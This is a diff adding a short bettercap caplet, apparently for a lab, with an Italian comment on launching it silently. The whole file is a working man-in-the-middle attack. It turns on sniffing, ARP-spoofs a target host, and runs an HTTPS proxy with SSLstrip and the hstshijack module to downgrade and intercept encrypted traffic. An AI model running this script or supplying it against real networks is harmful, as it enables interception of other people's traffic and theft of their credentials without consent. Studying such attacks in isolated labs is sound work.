@@ -1,0 +1,12 @@
+# Avvio in modalità silenziosa:
+# sudo bettercap --silent -iface eth0 -caplet scripts/bettercap_lab.cap
+
+net.probe on
+net.recon on
+net.sniff on
+set net.sniff.local true
+set arp.spoof.targets 10.0.2.15
+arp.spoof on
+https.proxy on
+set https.proxy.sslstrip on
+hstshijack/hstshijack
